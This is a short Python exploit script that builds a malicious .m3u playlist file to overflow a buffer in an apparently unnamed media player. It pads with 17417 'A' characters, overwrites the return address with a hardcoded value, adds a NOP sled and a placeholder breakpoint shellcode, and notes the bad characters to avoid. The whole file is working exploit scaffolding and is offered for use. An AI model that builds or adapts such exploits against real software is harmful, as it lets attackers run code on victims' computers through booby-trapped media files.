#! /usr/bin/python

buffer = "http://"

shellcode = "\xcc"

buffer += "A"*17417
buffer += "\xe1\xbc\x08\x76"		#7608BCE1
buffer += "\x90"*10
buffer += shellcode
buffer += "C"*(18000-4-10-17417)

# bad characters \x00\x0a

f=open("exploit.m3u","w")
f.write(buffer);
f.close()
